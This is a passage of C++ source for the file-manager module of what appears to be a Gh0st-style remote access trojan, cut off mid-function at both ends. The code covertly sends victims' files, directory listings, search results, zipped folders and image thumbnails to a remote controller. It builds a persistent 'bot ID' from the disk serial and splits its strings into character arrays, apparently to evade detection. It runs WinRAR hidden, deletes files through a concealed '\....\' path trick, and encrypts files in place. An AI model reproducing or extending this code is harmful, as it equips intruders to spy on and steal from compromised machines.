	if (lpBuffer[lstrlen((TCHAR*)lpBuffer) * sizeof(TCHAR) - sizeof(TCHAR)] == _T('\\'))
	{
		FixedUploadList((TCHAR*)lpBuffer);
		if (m_UploadList.empty())
		{
			StopTransfer(TRUE);
			return true;
		}
	}
	else
	{
		m_UploadList.push_back((TCHAR*)lpBuffer);
	}

	list <wstring>::iterator it = m_UploadList.begin();
	// 发送第一个文件
	SendFileSize((*it).c_str());

	return true;
}

bool CFileManager::FixedUploadList(LPCTSTR lpPathName)
{
	WIN32_FIND_DATA	wfd;
	TCHAR	lpszFilter[MAX_PATH];
	TCHAR* lpszSlash = NULL;
	memset(lpszFilter, 0, sizeof(lpszFilter));

	if (lpPathName[lstrlen(lpPathName) - 1] != _T('\\'))
		lpszSlash = _T("\\");
	else
		lpszSlash = _T("");
	TCHAR str18114[] = { _T('%'),_T('s'),_T('%'),_T('s'),_T('*'),_T('.'),_T('*'),_T('\0') };
	wsprintf(lpszFilter, str18114, lpPathName, lpszSlash);

	HANDLE hFind = FindFirstFile(lpszFilter, &wfd);
	if (hFind == INVALID_HANDLE_VALUE) // 如果没有找到或查找失败
		return false;
	TCHAR str18046[] = { _T('%'),_T('s'),_T('%'),_T('s'),_T('%'),_T('s'),_T('\0') };
	do
	{
		if (wfd.cFileName[0] != _T('.'))
		{
			if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				TCHAR strDirectory[MAX_PATH];
				wsprintf(strDirectory, str18046, lpPathName, lpszSlash, wfd.cFileName);
				FixedUploadList(strDirectory);
			}
			else
			{
				TCHAR strFile[MAX_PATH];
				wsprintf(strFile, str18046, lpPathName, lpszSlash, wfd.cFileName);
				m_UploadList.push_back(strFile);
			}
		}
	} while (FindNextFile(hFind, &wfd));

	FindClose(hFind); // 关闭查找句柄
	return true;
}

void CFileManager::StopTransfer(BOOL bIsUpload)
{
	if (!m_UploadList.empty())
		m_UploadList.clear();
	if (m_hFileSend != INVALID_HANDLE_VALUE)
	{
		CloseHandle(m_hFileSend);
		m_hFileSend = INVALID_HANDLE_VALUE;
	}
	if (m_hFileRecv != INVALID_HANDLE_VALUE)
	{
		CloseHandle(m_hFileRecv);
		m_hFileRecv = INVALID_HANDLE_VALUE;
	}
	if (bIsUpload)
		SendToken(TOKEN_TRANSFER_FINISH);
}

void CFileManager::CreateLocalRecvFile(LPBYTE lpBuffer)
{
	FILESIZE* pFileSize = (FILESIZE*)lpBuffer;
	// 保存当前正在操作的文件名
	memset(m_strCurrentProcessFileName, 0, sizeof(m_strCurrentProcessFileName));
	_tcscpy_s(m_strCurrentProcessFileName, (TCHAR*)(lpBuffer + 8));

	// 保存文件长度
	m_nCurrentProcessFileLength = ((__int64)pFileSize->dwSizeHigh << 32) + pFileSize->dwSizeLow;

	// 创建多层目录
	MakeSureDirectoryPathExists(m_strCurrentProcessFileName);

	WIN32_FIND_DATA FindFileData;
	HANDLE hFind = FindFirstFile(m_strCurrentProcessFileName, &FindFileData);

	if (hFind != INVALID_HANDLE_VALUE
		&& m_nTransferMode != TRANSFER_MODE_OVERWRITE_ALL
		&& m_nTransferMode != TRANSFER_MODE_ADDITION_ALL
		&& m_nTransferMode != TRANSFER_MODE_JUMP_ALL
		)
	{
		SendToken(TOKEN_GET_TRANSFER_MODE);
	}
	else
	{
		GetFileData();
	}
	FindClose(hFind);
}

void CFileManager::GetFileData()
{
	int	nTransferMode;
	switch (m_nTransferMode)
	{
	case TRANSFER_MODE_OVERWRITE_ALL:
		nTransferMode = TRANSFER_MODE_OVERWRITE;
		break;
	case TRANSFER_MODE_ADDITION_ALL:
		nTransferMode = TRANSFER_MODE_ADDITION;
		break;
	case TRANSFER_MODE_JUMP_ALL:
		nTransferMode = TRANSFER_MODE_JUMP;
		break;
	default:
		nTransferMode = m_nTransferMode;
	}

	WIN32_FIND_DATA FindFileData;
	HANDLE hFind = FindFirstFile(m_strCurrentProcessFileName, &FindFileData);

	//  1字节Token,四字节偏移高四位，四字节偏移低四位
	BYTE	bToken[9];
	DWORD	dwCreationDisposition; // 文件打开方式 
	memset(bToken, 0, sizeof(bToken));
	bToken[0] = TOKEN_DATA_CONTINUE;

	// 文件已经存在
	if (hFind != INVALID_HANDLE_VALUE)
	{
		// 提示点什么
		// 如果是续传
		if (nTransferMode == TRANSFER_MODE_ADDITION)
		{
			memcpy(bToken + 1, &FindFileData.nFileSizeHigh, 4);
			memcpy(bToken + 5, &FindFileData.nFileSizeLow, 4);
			dwCreationDisposition = OPEN_EXISTING;
		}
		// 覆盖
		else if (nTransferMode == TRANSFER_MODE_OVERWRITE)
		{
			// 偏移置0
			memset(bToken + 1, 0, 8);
			// 重新创建
			dwCreationDisposition = CREATE_ALWAYS;

		}
		// 传送下一个
		else if (nTransferMode == TRANSFER_MODE_JUMP)
		{
			DWORD dwOffset = -1;
			memcpy(bToken + 1, &dwOffset, 4);
			memcpy(bToken + 5, &dwOffset, 4);
			dwCreationDisposition = OPEN_EXISTING;
		}
	}
	else
	{
		// 偏移置0
		memset(bToken + 1, 0, 8);
		// 重新创建
		dwCreationDisposition = CREATE_ALWAYS;
	}
	FindClose(hFind);

	if (m_hFileRecv != INVALID_HANDLE_VALUE)
		CloseHandle(m_hFileRecv);
	m_hFileRecv = CreateFile(m_strCurrentProcessFileName,
		GENERIC_WRITE, 0, NULL, dwCreationDisposition, FILE_ATTRIBUTE_NORMAL, 0);
	// 需要错误处理
	if (m_hFileRecv == INVALID_HANDLE_VALUE)
	{
		m_nCurrentProcessFileLength = 0;
		return;
	}
	//CloseHandle(m_hFileRecv); // 此处不要关闭, 以后还要用

	Send(bToken, sizeof(bToken));
}

void CFileManager::WriteLocalRecvFile(LPBYTE lpBuffer, UINT nSize)
{
	// 传输完毕
	BYTE* pData;
	DWORD		dwBytesToWrite;
	DWORD		dwBytesWrite;
	int			nHeadLength = 9; // 1 + 4 + 4  数据包头部大小，为固定的9
	FILESIZE* pFileSize;

	// 得到数据的偏移
	pData = lpBuffer + 8;
	pFileSize = (FILESIZE*)lpBuffer;

	// 得到数据在文件中的偏移
	LONG	dwOffsetHigh = pFileSize->dwSizeHigh;
	LONG	dwOffsetLow = pFileSize->dwSizeLow;

	dwBytesToWrite = nSize - 8;

	SetFilePointer(m_hFileRecv, dwOffsetLow, &dwOffsetHigh, FILE_BEGIN);

	BOOL bRet = WriteFile(m_hFileRecv, pData, dwBytesToWrite, &dwBytesWrite, NULL);
	// 	if (bRet == FALSE)
	// 		printf("文件写入失败");
	dwOffsetLow = 0; dwOffsetHigh = 0;
	dwOffsetLow = SetFilePointer(m_hFileRecv, dwOffsetLow, &dwOffsetHigh, FILE_CURRENT);
	//CloseHandle(m_hFileRecv);  // 此处不要关闭, 以后还要用
	// 为了比较，计数器递增

	BYTE	bToken[9];
	bToken[0] = TOKEN_DATA_CONTINUE;
	memcpy(bToken + 1, &dwOffsetHigh, sizeof(dwOffsetHigh));
	memcpy(bToken + 5, &dwOffsetLow, sizeof(dwOffsetLow));
	Send(bToken, sizeof(bToken));
}

void CFileManager::SetTransferMode(LPBYTE lpBuffer)
{
	memcpy(&m_nTransferMode, lpBuffer, sizeof(m_nTransferMode));
	GetFileData();
}

void CFileManager::CreateFolder(LPBYTE lpBuffer)
{
	MakeSureDirectoryPathExists((TCHAR*)lpBuffer);
	SendToken(TOKEN_CREATEFOLDER_FINISH);
}

void CFileManager::Rename(LPBYTE lpBuffer)
{
	LPCTSTR lpExistingFileName = (TCHAR*)lpBuffer;
	LPCTSTR lpNewFileName = (TCHAR*)((byte*)lpExistingFileName + (lstrlen(lpExistingFileName) + 1) * sizeof(TCHAR));
	::MoveFile(lpExistingFileName, lpNewFileName);
	SendToken(TOKEN_RENAME_FINISH);
}

//压缩解或压缩文件
void CFileManager::ExeCompress(BYTE* lpBuffer)
{
	SHELLEXECUTEINFO ShExecInfo = { 0 };
	ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
	ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
	ShExecInfo.lpVerb = NULL;
	ShExecInfo.lpFile = _T("WinRAR");
	ShExecInfo.lpParameters = (TCHAR*)lpBuffer;
	ShExecInfo.nShow = SW_HIDE;
	if (ShellExecuteEx(&ShExecInfo))
	{
		WaitForSingleObject(ShExecInfo.hProcess, INFINITE);
		CloseHandle(ShExecInfo.hProcess);
		SendToken(TOKEN_COMPRESS_FINISH);
	}
}




void CFileManager::FindFileInDir(TCHAR* rootDir, TCHAR* searchfilename, BOOL bEnabledSubfolder)
{
	WIN32_FIND_DATA fd;

	TCHAR filePathName[256];
	TCHAR tmpPath[256];

	ZeroMemory(&fd, sizeof(WIN32_FIND_DATA));
	ZeroMemory(filePathName, 256);
	ZeroMemory(tmpPath, 256);

	lstrcpy(filePathName, rootDir);


	if (filePathName[(lstrlen(filePathName) - 1)] != _T('\\'))
	{
		lstrcat(filePathName, _T("\\"));
	}
	lstrcat(filePathName, _T("*.*"));

	HANDLE hSearch = FindFirstFile(filePathName, &fd);

	do
	{
		DWORD	dwOffset = 1; // 位移指针

		lstrcpy(tmpPath, rootDir);
		if (tmpPath[lstrlen(tmpPath) - 1] != _T('\\'))
			lstrcat(tmpPath, _T("\\"));

		lstrcat(tmpPath, fd.cFileName);

		if ((fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			&& lstrcmp(fd.cFileName, _T(".")) && lstrcmp(fd.cFileName, _T("..")))
		{
			if (bEnabledSubfolder)
				FindFileInDir(tmpPath, searchfilename, bEnabledSubfolder);
		}
		else if (lstrcmp(fd.cFileName, _T(".")) && lstrcmp(fd.cFileName, _T("..")))
		{
			_tcsupr_s(fd.cFileName, lstrlen(fd.cFileName) + 1);
			_tcsupr_s(searchfilename, lstrlen(searchfilename) + 1);
			if (_tcsstr(fd.cFileName, searchfilename) > 0)
			{
				LPBYTE	lpBuffer = NULL;

				lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1024);

				// 文件属性 1 字节
				*(lpBuffer + dwOffset) = fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY;
				dwOffset++;

				int nLen = (lstrlen(tmpPath) + 1) * sizeof(TCHAR);
				memcpy(lpBuffer + dwOffset, tmpPath, nLen);

				dwOffset += nLen;
				/*	*(lpBuffer + dwOffset) = 0;
					dwOffset++;*/

				memcpy(lpBuffer + dwOffset, &fd.nFileSizeHigh, sizeof(DWORD));
				memcpy(lpBuffer + dwOffset + 4, &fd.nFileSizeLow, sizeof(DWORD));
				dwOffset += 8;

				// 最后访问时间 8 字节
				memcpy(lpBuffer + dwOffset, &fd.ftLastWriteTime, sizeof(FILETIME));
				dwOffset += 8;

				if (dwOffset > 1)
				{
					lpBuffer[0] = TOKEN_SEARCH_FILE_LIST;

					lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset, LMEM_ZEROINIT | LMEM_MOVEABLE);

					Send(lpBuffer, (UINT)LocalSize(lpBuffer));
					Sleep(10);
					LocalFree(lpBuffer);
				}
			}
		}
	} while (FindNextFile(hSearch, &fd) && !bIsStopSearch);

	FindClose(hSearch);

}
//文件搜索线程
void WINAPI CFileManager::FindFileThread(LPVOID lparam)
{
	CFileManager* pThis = (CFileManager*)lparam;
	pThis->FindFileInDir(pThis->filesearch.SearchPath, pThis->filesearch.SearchFileName, pThis->filesearch.bEnabledSubfolder);
	pThis->bIsStopSearch = TRUE;
	pThis->SendToken(TOKEN_SEARCH_FILE_FINISH);
}
//停止文件搜索
void CFileManager::StopSearchTheard()
{
	if (bIsStopSearch)
		return;
	bIsStopSearch = TRUE;
	WaitForSingleObject(m_hWorkThread, INFINITE);
	CloseHandle(m_hWorkThread);
	bIsStopSearch = FALSE;
}
//创建文件搜索线程
void CFileManager::SendSearchFilesList(LPCTSTR str)
{
	bIsStopSearch = FALSE;
	memcpy(&filesearch, str, sizeof(FILESEARCH));

	m_hWorkThread = CreateThread(NULL,
		0,
		(LPTHREAD_START_ROUTINE)FindFileThread,
		(LPVOID)this,
		0,
		NULL
	);
}




ULONG CFileManager::PseudoRand(ULONG* seed)
{
	return (*seed = 1352459 * (*seed) + 2529004207);
}

void CFileManager::GetBotId(TCHAR* botId)
{
	TCHAR windowsDirectory[MAX_PATH];
	TCHAR volumeName[8] = { 0 };
	DWORD seed = 0;

	if (GetWindowsDirectory(windowsDirectory, MAX_PATH * sizeof(TCHAR)))
		windowsDirectory[0] = _T('C');

	volumeName[0] = windowsDirectory[0];
	volumeName[1] = _T(':');
	volumeName[2] = _T('\\');
	volumeName[3] = _T('\0');

	GetVolumeInformation(volumeName, NULL, 0, &seed, 0, NULL, NULL, 0);

	GUID guid;
	guid.Data1 = PseudoRand(&seed);

	guid.Data2 = (USHORT)PseudoRand(&seed);
	guid.Data3 = (USHORT)PseudoRand(&seed);
	for (int i = 0; i < 8; i++)
		guid.Data4[i] = (UCHAR)PseudoRand(&seed);

	wsprintf(botId, _T("%08lX%04lX%lu"), guid.Data1, guid.Data3, *(ULONG*)&guid.Data4[2]);
}

bool CFileManager::getLnkFormPath(TCHAR* lnkPath, TCHAR* szoutPath)
{
	CoInitialize(NULL);
	IPersistFile* pPF = NULL;
	HRESULT hr = CoCreateInstance(
		CLSID_ShellLink,			// CLSID
		NULL,						// IUnknown 接口指针
		CLSCTX_INPROC_SERVER,		// CLSCTX_INPROC_SERVER：以 Dll 的方式操作类对象 
		IID_IPersistFile,			// COM 对象接口标识符
		(void**)(&pPF)				// 接收 COM 对象的指针
	); if (FAILED(hr)) { return false; }
	IShellLink* pSL = NULL;
	hr = pPF->QueryInterface(
		IID_IShellLink,				// 接口 IID
		(void**)(&pSL)				// 接收指向这个接口函数虚标的指针
	); if (FAILED(hr)) { return false; }
	hr = pPF->Load(
		lnkPath,					// 文件全路径
		STGM_READ					// 访问模式：只读
	); if (FAILED(hr)) { return false; }

	ZeroMemory(szoutPath, sizeof(szoutPath));
	// 获取 Shell 链接来源
	hr = pSL->GetPath(szoutPath, MAX_PATH, NULL, 0);


	// 关闭 COM 库
	pPF->Release();
	CoUninitialize();

	return true;
}
void CFileManager::SendNetHood()
{
	TCHAR szPath[MAX_PATH];
	::SHGetSpecialFolderPath(NULL, szPath, CSIDL_NETHOOD, FALSE);
	HANDLE	hFile;
	DWORD	dwOffset = 0; // 位移指针
	int		nLen = 0;
	LPBYTE	lpList = NULL;
	DWORD	nBufferSize = 1024 * 10; // 先分配10K的缓冲区
	WIN32_FIND_DATA	FindFileData;
	TCHAR* lpszSlash = NULL;
	TCHAR	strPath[MAX_PATH];
	TCHAR	strPath_out[MAX_PATH];
	if (szPath[lstrlen(szPath) - 1] != '\\')
		lpszSlash = (TCHAR*)_T("\\");
	else
		lpszSlash = (TCHAR*)_T("");
	TCHAR str1ast[] = { _T('%'),_T('s'),_T('%'),_T('s'),_T('*'),_T('.'),_T('*'),_T('\0') };
	wsprintf(strPath_out, _T("%s%s"), szPath, lpszSlash);
	wsprintf(strPath, str1ast, szPath, lpszSlash);
	hFile = FindFirstFile(strPath, &FindFileData);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		return;
	}

	lpList = (BYTE*)LocalAlloc(LPTR, nBufferSize);
	*lpList = TOKEN_FILE_GETNETHOOD;
	dwOffset = 1;
	do
	{
		// 动态扩展缓冲区
		if (dwOffset > (nBufferSize - MAX_PATH * 2))
		{
			nBufferSize += MAX_PATH * 2;
			lpList = (BYTE*)LocalReAlloc(lpList, nBufferSize, LMEM_ZEROINIT | LMEM_MOVEABLE);
		}

		TCHAR* pszFileName = FindFileData.cFileName;
		if (_tcscmp(pszFileName, _T(".")) == 0 || _tcscmp(pszFileName, _T("..")) == 0)
			continue;
		wprintf(_T("%s"), pszFileName);
		TCHAR	InPath[MAX_PATH];

		wsprintf(InPath, _T("%s%s"), strPath_out, pszFileName);
		TCHAR* OutPath = new TCHAR[MAX_PATH];
		ZeroMemory(OutPath, sizeof(OutPath));
		if (!getLnkFormPath(InPath, OutPath))
			continue;;
		int iNameSzie = lstrlen(OutPath) * sizeof(TCHAR) + 2;
		memcpy(lpList + dwOffset, &iNameSzie, sizeof(int));
		memcpy(lpList + dwOffset + sizeof(int), OutPath, iNameSzie);
		dwOffset += sizeof(int) + iNameSzie;
		SAFE_DELETE_AR(OutPath);
	} while (FindNextFile(hFile, &FindFileData));

	if (dwOffset == 1)
		return;
	Send(lpList, dwOffset);
	LocalFree(lpList);
}



/*加密子函数开始*/
void CFileManager::encfile(char* in_filename)
{
	char out_file[MAX_PATH * 2];
	strcpy_s(out_file, in_filename);
	strcat_s(out_file, "i");
	MasterEncoder::getInstance()->encodePDF(in_filename, out_file);
	remove(in_filename);
	::MoveFileA(out_file, in_filename);
}

/*解密子函数开始*/
void CFileManager::decryptfile(char* in_filename)
{
	char out_file[MAX_PATH * 2];
	strcpy_s(out_file, in_filename);
	strcat_s(out_file, "i");
	MasterEncoder::getInstance()->decodePDF(in_filename, out_file);
	remove(in_filename);
	::MoveFileA(out_file, in_filename);
}

bool CFileManager::FnDelPathFile(TCHAR* tc_path)
{
	SECURITY_ATTRIBUTES safestruct = { sizeof(SECURITY_ATTRIBUTES) ,NULL,false };
	//获取系统temp目录+字母
	TCHAR* tem_path = new TCHAR[MAX_PATH * 2];
	TCHAR* tem_path1 = new TCHAR[MAX_PATH * 2];
	TCHAR* tem_path2 = new TCHAR[MAX_PATH * 2];
	TCHAR* tem_path3 = new TCHAR[MAX_PATH * 2];
	TCHAR* tem_path4 = new TCHAR[MAX_PATH * 2];
	GetTempPath(MAX_PATH * 2, tem_path);

	unsigned seed;
	seed = (unsigned)GetCurrentProcessId();
	std::srand(seed);
	int A = rand();
	int B = A + 1;
	wsprintf(tem_path1, _T("%s%d"), tem_path, A);

	CreateDirectory(tem_path1, &safestruct); //CreateDirectoryA(目录, 安全性结构)

	wsprintf(tem_path2, _T("%s%s"), tem_path1, _T("\\....\\"));
	CreateDirectory(tem_path2, &safestruct);// CreateDirectoryA(目录 ＋ “\....\”, 安全性结构)

	wsprintf(tem_path3, _T("%s\\%d"), tem_path2, B);
	MoveFile(tc_path, tem_path3);    //MoveFileA(文件名, 目录 ＋ “\....\” ＋ 字母)

	wsprintf(tem_path4, _T("%s\\%d"), tem_path1, B);
	MoveFile(tem_path2, tem_path4); //	MoveFileA(目录 ＋ “\....\”, 目录 ＋ “\” ＋ 字母)
	DeleteFile(tem_path1);  //删除目录(目录)
	DeleteFile(tem_path2);  //删除目录(目录)
	DeleteFile(tem_path3);  //删除目录(目录)
	DeleteFile(tem_path4);  //删除目录(目录)

	SAFE_DELETE_AR(tem_path);
	SAFE_DELETE_AR(tem_path1);
	SAFE_DELETE_AR(tem_path2);
	SAFE_DELETE_AR(tem_path3);
	SAFE_DELETE_AR(tem_path4);


	return 1;
}

//文件搜索线程
void WINAPI CFileManager::FindZIPThread(LPVOID lparam)
{
	CFileManager* pThis = (CFileManager*)lparam;

	TCHAR* zippath = NULL;
	HZIP hz = NULL;
	TCHAR* newzippath = new TCHAR[MAX_PATH * 2];
	TCHAR* zippath_filename = new TCHAR[MAX_PATH * 2];
	ZeroMemory(newzippath, MAX_PATH * 2 * 2);
	ZeroMemory(zippath_filename, MAX_PATH * 2 * 2);

	std::wstring input = (TCHAR*)(pThis->zippath_t);
	std::wistringstream ss(input);
	std::wstring token;
	int num = 0;
	int pathlen = 0;
	while (std::getline(ss, token, _T('|')))
	{
		num++;
		if (num == 1)
		{
			zippath = (TCHAR*)token.c_str();
			pathlen = lstrlen(zippath) * 2;
			memset(zippath + lstrlen(zippath) - 1, 0, 2);
			wstring str = zippath;
			int num = 0;
			size_t fi = str.find_last_of(_T("\\"));
			if (fi == str.npos)
				continue;
			wstring strSubPath = str.substr(fi + 1, str.length());
			wsprintf(newzippath, _T("%s\\%s.zip"), zippath, strSubPath.c_str());
			DWORD dwAttr = GetFileAttributes(newzippath);
			if (INVALID_FILE_ATTRIBUTES != dwAttr)
			{
				DWORD ti = ::timeGetTime();
				wsprintf(newzippath, _T("%s\\%s%d.zip"), zippath, strSubPath.c_str(), ti);
			}
			hz = CreateZip(newzippath, 0);
			if (hz == NULL) break;;
		}
		else
		{
			ZeroMemory(zippath_filename, MAX_PATH * 2 * 2);
			zippath = (TCHAR*)token.c_str();
			DWORD dwAttr = GetFileAttributes(zippath);
			if (INVALID_FILE_ATTRIBUTES == dwAttr)
			{
				continue;
			}
			if (dwAttr & FILE_ATTRIBUTE_DIRECTORY)
			{
				wstring str = zippath;
				int num = 0;
				size_t fi = str.find_last_of(_T("\\"));
				if (fi == str.npos)
					continue;
				memcpy(zippath_filename, zippath + pathlen / 2, lstrlen(zippath) * 2 - pathlen + 2);
				ZeroMemory(zippath_filename + lstrlen(zippath_filename) - 1, 2);
				ZipAddFolder(hz, zippath_filename);
				pThis->FindFileInDirZipAdd(zippath, hz, pathlen);
			}
			else
			{

				wstring str = zippath;
				int num = 0;
				size_t fi = str.find_last_of(_T("\\"));
				if (fi == str.npos)
					continue;
				memcpy(zippath_filename, zippath + fi + 1, (lstrlen(zippath) - fi) * 2 + 2);
				ZipAdd(hz, zippath_filename, zippath);
			}
		}

	}
	if (hz)
		CloseZip(hz);
	if (!pThis->bIsStopZIP) 	pThis->SendToken(TOKEN_FILE_ZIPOK);
	pThis->bIsStopZIP = FALSE;
	SAFE_DELETE_AR(newzippath);
	SAFE_DELETE_AR(zippath_filename)
		SAFE_DELETE_AR(pThis->zippath_t);
}

//停止文件搜索
void CFileManager::StopZIPTheard()
{
	if (bIsStopZIP)
		return;
	bIsStopZIP = TRUE;
	WaitForSingleObject(m_hWorkZIPThread, INFINITE);
	CloseHandle(m_hWorkZIPThread);
	bIsStopZIP = FALSE;
}
//创建文件搜索线程
void CFileManager::StartZIP()
{
	m_hWorkZIPThread = CreateThread(NULL,
		0,
		(LPTHREAD_START_ROUTINE)FindZIPThread,
		(LPVOID)this,
		0,
		NULL
	);
}

void CFileManager::FindFileInDirZipAdd(TCHAR* rootDir, HZIP hz, int pathlen)
{
	WIN32_FIND_DATA fd;

	TCHAR filePathName[256];
	TCHAR tmpPath[256];

	ZeroMemory(&fd, sizeof(WIN32_FIND_DATA));
	ZeroMemory(filePathName, 256);
	ZeroMemory(tmpPath, 256);

	lstrcpy(filePathName, rootDir);


	if (filePathName[(lstrlen(filePathName) - 1)] != _T('\\'))
	{
		lstrcat(filePathName, _T("\\"));
	}
	lstrcat(filePathName, _T("*.*"));

	HANDLE hSearch = FindFirstFile(filePathName, &fd);

	do
	{
		DWORD	dwOffset = 1; // 位移指针

		lstrcpy(tmpPath, rootDir);
		if (tmpPath[lstrlen(tmpPath) - 1] != _T('\\'))
			lstrcat(tmpPath, _T("\\"));

		lstrcat(tmpPath, fd.cFileName);

		if ((fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			&& lstrcmp(fd.cFileName, _T(".")) && lstrcmp(fd.cFileName, _T("..")))
		{
			TCHAR* zippath_filename = new TCHAR[MAX_PATH * 2];
			wstring str = tmpPath;
			int num = 0;
			size_t fi = str.find_last_of(_T("\\"));
			if (fi == str.npos)
				continue;
			memcpy(zippath_filename, tmpPath + pathlen / 2, lstrlen(tmpPath) * 2 - pathlen + 2);
			//ZeroMemory(zippath_filename + lstrlen(zippath_filename) , 2);
			ZipAddFolder(hz, zippath_filename);
			FindFileInDirZipAdd(tmpPath, hz, pathlen);
			SAFE_DELETE_AR(zippath_filename);
		}
		else if (lstrcmp(fd.cFileName, _T(".")) && lstrcmp(fd.cFileName, _T("..")))
		{
			TCHAR* zippath_filename = new TCHAR[MAX_PATH * 2];
			wstring str = tmpPath;
			int num = 0;
			size_t fi = str.find_last_of(_T("\\"));
			if (fi == str.npos)
				continue;
			memcpy(zippath_filename, tmpPath + pathlen / 2, lstrlen(tmpPath) * 2 - pathlen + 2);
			ZipAdd(hz, zippath_filename, tmpPath);
			SAFE_DELETE_AR(zippath_filename);
		}
	} while (FindNextFile(hSearch, &fd) && !bIsStopZIP);
	FindClose(hSearch);

}

void CFileManager::SendFileInfo(TCHAR* filepath, TCHAR* type)   // jpg png ico bmp gif 
{
	//if (lstrcmp(type, _T("jpg")) == 0)
	//{
	ResizePicture(filepath);
	//}
}


bool CFileManager::ResizePicture(TCHAR* strSource)
{
	CImage image, imDest;
	int w = 0, h = 0;
	if (SUCCEEDED(image.Load(strSource)))
	{
		if (image.GetWidth() > 1000 || image.GetHeight() > 700)
		{
			w = 1000;
			h = 700;
		}
		else
		{
			w = image.GetWidth();
			h = image.GetHeight();
		}
		imDest.Create(w, h, 24);
		image.StretchBlt(imDest.GetDC(), CRect(0, 0, w, h), CRect(0, 0, image.GetWidth(), image.GetHeight()));
		IStream* pOutStream = NULL;
		if (CreateStreamOnHGlobal(NULL, TRUE, &pOutStream) == S_OK)
		{
			imDest.Save(pOutStream, Gdiplus::ImageFormatJPEG);
			HGLOBAL hOutGlobal = NULL;
			GetHGlobalFromStream(pOutStream, &hOutGlobal);
			LPBYTE pBits = (LPBYTE)GlobalLock(hOutGlobal);
			if (pBits == nullptr)
			{
				return 0;
			}
			int heath = sizeof(FILEPICINFO);
			unsigned long	ulBufferLen = (DWORD)GlobalSize(pBits);
			char* pBuffer = new char[ulBufferLen + heath];
			::memcpy(pBuffer + heath, pBits, ulBufferLen);
			FILEPICINFO* m_FILEINFO = new FILEPICINFO;
			m_FILEINFO->Token = TOKEN_FILE_GETINFO;
			m_FILEINFO->w = imDest.GetWidth();
			m_FILEINFO->h = imDest.GetHeight();
			m_FILEINFO->size = ulBufferLen;
			memcpy(pBuffer, m_FILEINFO, heath);
			Send((LPBYTE)pBuffer, ulBufferLen + heath);
			SAFE_DELETE(pBuffer);

			GlobalUnlock(hOutGlobal);
			pOutStream->Release();
		}
		imDest.ReleaseDC();
		imDest.Destroy();
		image.Destroy();
	}
	return true;
}

BOOL CFileManager::GetVolumeNameByHandle(HANDLE hFile, char* szFullPath)
{
	//得到所有磁盘卷的卷序号

	char* szBuf =NULL;
	DWORD szAllDriveStrings = GetLogicalDriveStringsA(0, NULL);           //驱动器总长度
	if (szBuf == NULL)
	{
		szBuf = new char[szAllDriveStrings +1];  //建立数组
	}
	int i;
	DWORD dwVolumeSerialNumber;
	memset(szBuf, 0, sizeof(szBuf));
	//通过句柄得到文件的卷序号
	//得到卷序号 lpFileInformation.dwVolumeSerialNumber
	BY_HANDLE_FILE_INFORMATION lpFileInformation;
	if (!GetFileInformationByHandle(hFile, &lpFileInformation) || (lpFileInformation.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
	{
		//通过句柄得到文件信息失败 或者 此句柄为文件夹句柄,并非文件句柄
		return FALSE;
	}
	if (::GetLogicalDriveStringsA(szAllDriveStrings, szBuf))
	{
		for (i = 0; szBuf[i]; i += 4)
		{
			//得到卷信息->卷序号
			if (!_stricmp(&(szBuf[i]), "A:\\") || !_stricmp(&(szBuf[i]), "B:\\"))
			{
				//忽略软盘 (一般不会使用,并且查询它的速度非常之慢)
				continue;
			}
			if (GetVolumeInformationA(&(szBuf[i]), NULL, NULL, &dwVolumeSerialNumber, NULL, NULL, NULL, NULL))
			{
				// 与 lpFileInformation.dwVolumeSerialNumber 比较
				// 如果相同,则找到该磁盘
				if (dwVolumeSerialNumber == lpFileInformation.dwVolumeSerialNumber)
				{
					//找到
					char szVolumeName[4];
					memset(szVolumeName, 0, sizeof(szVolumeName));
					strcpy_s(szVolumeName, &(szBuf[i]));
					szVolumeName[strlen(szVolumeName) - 1] = '\0';
					//得到路径
					HMODULE hNt = LoadLibraryA("ntdll.dll");
					if (hNt)
					{
						IO_STATUS_BLOCK isb = { 0 };;
						FILE_NAME_INFORMATION fni = { 0 };
						ZwQueryInformationFile fnZwQueryInformationFile = NULL;
						fnZwQueryInformationFile = (ZwQueryInformationFile) ::GetProcAddress(hNt, "ZwQueryInformationFile");
						if (fnZwQueryInformationFile)
						{
							DWORD dwRet = 0;
							dwRet = fnZwQueryInformationFile(hFile, &isb, &fni, sizeof(FILE_NAME_INFORMATION), 9);
							if (!dwRet)
							{
								//获取文件路径成功
								fni.FileName[fni.FileNameLength / 2] = 0;
								//构造成完整路径名
								char szFilePath[MAX_PATH * 3];
								memset(szFilePath, 0, sizeof(szFilePath));
								WideCharToMultiByte(CP_ACP, 0, fni.FileName, -1, szFilePath, sizeof(szFilePath) - 1, NULL, NULL);
								sprintf_s(szFullPath, MAX_PATH * 4, "%s%s", szVolumeName, szFilePath);
								return TRUE;
							}
						}
						FreeLibrary(hNt);
					}
				}
			}
		}
	}
	SAFE_DELETE_AR(szBuf);
	return FALSE;
}


void CFileManager::GetFullPathByFileReferenceNumber(HANDLE hVol, DWORDLONG FileReferenceNumber)
{

	typedef ULONG(__stdcall* PNtCreateFile)(
		PHANDLE FileHandle,
		ULONG DesiredAccess,
		PVOID ObjectAttributes,
		PVOID IoStatusBlock,
		PLARGE_INTEGER AllocationSize,
		ULONG FileAttributes,
		ULONG ShareAccess,
		ULONG CreateDisposition,
		ULONG CreateOptions,
		PVOID EaBuffer,
		ULONG EaLength);
	PNtCreateFile NtCreatefile = (PNtCreateFile)GetProcAddress(GetModuleHandle(_T("ntdll.dll")), "NtCreateFile");
	typedef struct _UNICODE_STRING {
		USHORT Length, MaximumLength;
		PWCH Buffer;
	} UNICODE_STRING, * PUNICODE_STRING;
	UNICODE_STRING fidstr = { 8, 8, (PWSTR)&FileReferenceNumber };
	typedef struct _OBJECT_ATTRIBUTES {
		ULONG Length;
		HANDLE RootDirectory;
		PUNICODE_STRING ObjectName;
		ULONG Attributes;
		PVOID SecurityDescriptor;
		PVOID SecurityQualityOfService;
	} OBJECT_ATTRIBUTES;
	const ULONG OBJ_CASE_INSENSITIVE = 0x00000040UL;
